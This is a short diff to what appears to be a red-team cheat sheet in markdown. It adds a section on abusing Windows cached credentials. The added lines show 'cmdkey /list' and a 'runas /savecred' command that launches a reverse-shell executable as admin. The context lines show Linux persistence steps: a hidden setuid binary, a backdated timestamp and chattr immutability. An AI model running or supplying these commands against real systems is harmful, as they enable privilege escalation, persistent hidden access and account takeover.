@@ -130,3 +130,11 @@ Create a team ssh key and drop it into any authorzied_keys files you can in user
  2. <code>chmod u+s /.svc & chmod u+x /.svc</code>
  3.  <code>touch -d "5 January 2021" /.svc</code>
  4.  <code>chattr +i /.svc</code>
+
+###CMDKey stores creds on windows systems
+You can cache creds through runas on windows systems which will allow anyone to runas a given user with those cached creds. Check for the following:
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>cmdkey /list</code>
+&nbsp;&nbsp;&nbsp;&nbsp;<code>runas /savecred /user:admin C:\PrivEsc\reverse.exe</code>*if you find the admin account for example, run it like this*
+
+
